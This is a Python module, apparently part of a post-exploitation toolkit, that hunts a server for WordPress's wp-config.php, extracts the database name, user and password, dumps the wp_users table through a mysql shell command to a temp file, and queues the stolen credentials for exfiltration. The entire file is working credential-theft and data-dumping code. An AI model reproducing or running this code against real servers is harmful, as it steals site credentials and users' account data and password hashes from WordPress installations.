import os
import re
from queue import Queue

WP_CONFIG = ""
DB_NAME = ""
DB_USER = ""
DB_PW = ""
DUMP_FILE = "/tmp/dump_DB.txt"

def get_path(f_name):
    f_path = False
    breaker = False
    try:
        for root, dirs, files in os.walk('/',topdown=True):
            for name in files:
                if name == f_name:
                    f_path = os.path.abspath(os.path.join(root, name))
                    breaker = True 
                    #print("[+] File Path: " + f_path) # 1.W QUEUE
                    return f_path
            if breaker:
                break   
    except:
        pass
    return f_path   

def get_db_creds(f_path):
    global DB_USER, DB_PW, DB_NAME
    try:
        t_file = open(f_path, "r")
        data = t_file.read()
        t_file.close()
        db_user_hit = re.search("%s" % '.*DB_USER.*', data)
        db_pw_hit = re.search("%s" % '.*DB_PASSWORD.*', data)
        db_name_hit = re.search("%s" % '.*DB_NAME.*', data)
        if db_user_hit and db_pw_hit and db_name_hit:
            user_line = db_user_hit.group()
            hit = re.findall("%s" % "'(.*?)'", user_line)    
            DB_USER = hit[1]
            user_line = db_pw_hit.group()
            hit = re.findall("%s" % "'(.*?)'", user_line)    
            DB_PW = hit[1]
            user_line = db_name_hit.group()
            hit = re.findall("%s" % "'(.*?)'", user_line)    
            DB_NAME = hit[1]
            return True
        else:
            return False
    except:
        return False
   
def dump_db():
    try:
        cmd = f"mysql -u {DB_USER} --password='{DB_PW}' -e 'select * from {DB_NAME}.wp_users \G;' > {DUMP_FILE}"
        status = os.system(cmd)
        if status == 0:
            return True
        return False
    except:
        return False

def dumping_main(exfiltrate: Queue):
    config_path = get_path('wp-config.php')
    if config_path:
        if get_db_creds(config_path):
            exfiltrate.put(f"[+] DB {DB_NAME} Creds: {DB_USER}:{DB_PW}")
        if DB_NAME and DB_USER and DB_PW:
            if dump_db():
                exfiltrate.put(f"Dumping DB: {DB_NAME} to File: {DUMP_FILE}") 

#dumping_main()